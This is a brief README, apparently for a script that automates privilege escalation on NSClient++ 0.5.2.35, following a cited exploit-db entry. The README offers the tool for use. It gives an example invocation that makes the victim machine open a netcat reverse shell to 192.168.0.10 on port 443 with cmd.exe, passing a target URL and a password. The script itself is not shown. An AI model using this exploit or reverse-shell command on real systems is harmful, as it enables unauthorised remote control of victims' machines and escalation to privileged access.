# NSClient-0.5.2.35---Privilege-Escalation
Automated way of exploiting vulnerable NSClient++ 0.5.2.35 for privilege escalation.

Based on Steps described here: https://www.exploit-db.com/exploits/46802
 
 
Example Usage (opening reverse shell using netcat on the victim machine)

./exploit.py "C:\\Temp\\nc.exe 192.168.0.10 443 -e cmd.exe" https://192.168.0.100:443 supersecurepassword
 
